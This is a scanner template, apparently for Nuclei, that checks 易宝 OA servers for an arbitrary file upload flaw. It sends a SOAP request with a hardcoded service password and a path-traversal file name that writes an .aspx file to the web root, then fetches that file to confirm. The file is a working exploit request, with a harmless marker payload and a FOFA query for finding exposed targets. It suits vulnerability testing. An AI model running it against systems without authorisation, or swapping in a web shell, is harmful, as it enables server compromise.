id: epro-UploadBillFile-fileupload
info:
  name: 易宝 OA UploadBillFile.asmx - 任意文件上传漏洞
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%98%93%E5%AE%9DOA/%E6%98%93%E5%AE%9DOA-BasicService.asmx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: title="欢迎登录易宝OA系统" || app="顶讯科技-易宝OA系统"
  tags: epro,fileupload,oa

variables:
  filename: "{{to_lower(rand_base(4))}}"

http:
  - raw:
      - |
        POST /WebService/BasicService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        SOAPAction: http://tempuri.org/UploadBillFile
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 521

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
          <soapenv:Header/>
          <soapenv:Body>
              <tem:UploadBillFile>
                <!--type: base64Binary-->
                <tem:fs>aGVsbG8gd29ybGQgbGVhZA==</tem:fs>
                <!--type: string-->
                <tem:FileName>../../manager/{{filename}}.aspx</tem:FileName>
                <!--type: string-->
                <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
              </tem:UploadBillFile>
          </soapenv:Body>
        </soapenv:Envelope>

      
      - |+
        GET /{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'hello world lead')
        condition: and